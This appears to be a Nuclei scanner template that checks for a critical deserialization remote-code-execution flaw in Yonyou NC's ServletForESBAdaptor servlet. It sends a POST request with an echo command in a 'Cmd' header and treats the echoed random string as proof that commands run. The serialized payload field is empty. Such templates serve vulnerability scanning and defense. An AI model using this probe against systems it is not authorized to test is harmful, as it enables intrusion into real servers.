id: youyouNC-ServletForESBAdaptor-rce

info:
  name: 用友NC ServletForESBAdaptor 反序列化RCE漏洞
  author: youyouNC
  severity: critical
  tags: youyouNC

http:
  - raw:
      - |
        POST /servlet/~ecp/com.ufida.eip.adaptor.servlet.ServletForESBAdaptor HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Cmd: echo {{randstr}}
        Accept-Encoding: gzip

        {{hex_decode("")}}
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{{randstr}}'
          - 'java.util'
        condition: and
    matchers-condition: and
